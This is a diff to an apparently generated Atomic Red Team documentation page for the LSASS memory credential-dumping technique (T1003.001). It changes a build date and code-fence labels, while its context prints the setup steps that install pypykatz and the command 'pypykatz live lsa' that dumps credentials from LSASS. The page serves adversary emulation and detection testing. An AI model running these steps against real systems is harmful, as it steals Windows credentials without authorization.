@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.001"
 attack_technique_name: "OS Credential Dumping: LSASS Memory"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "c37bc535-5c62-4195-9cc3-0517673171d8"
@@ -58,13 +58,13 @@ Computer must have python 3 installed
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
 invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
 Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
@@ -74,13 +74,13 @@ Computer must have venv configured at #{venv_path}
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path -Path "#{venv_path}") { exit 0 } else { exit 1 }
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 py -m venv "#{venv_path}"
 ```
 
@@ -88,13 +88,13 @@ pypykatz must be installed
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 & "#{venv_path}\Scripts\pip.exe" install --no-cache-dir pypykatz 2>&1 | Out-Null
 ```
 
@@ -105,13 +105,13 @@ if (Get-Command "#{venv_path}\Scripts\pypykatz" -errorAction SilentlyContinue) {
 
 ### Command
 
-```commandprompt
+```cmd
 "#{venv_path}\Scripts\pypykatz" live lsa
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del "%temp%\nanodump.dmp" > nul 2> nul
 ```
 
